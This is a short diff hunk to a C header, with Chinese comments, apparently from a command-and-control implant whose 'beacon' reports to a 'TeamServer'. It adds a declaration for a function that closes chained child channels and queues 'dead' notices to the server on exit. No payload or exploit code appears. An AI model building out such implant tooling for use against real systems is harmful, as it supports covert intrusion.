@@ -124,6 +124,13 @@ VOID CascadeInit(CascadeManager* cm, struct BeaconContext* ctx);
 /* 释放级联管理器及所有通道 */
 VOID CascadeFree(CascadeManager* cm);
 
+/*
+ * 同步关闭所有活跃子通道，并为每个通道入队 CASCADE_DEAD 通知。
+ * 应在 beacon exit 命令处理时、设置 should_exit 之前调用，
+ * 确保 Dead 包在当前 flush 周期内随 outbox 一同发往 TeamServer。
+ */
+VOID CascadeShutdownAll(CascadeManager* cm);
+
 /* 轮询所有通道，返回待处理的数据包列表（调用方负责释放） */
 PacketList CascadePoll(CascadeManager* cm);
 
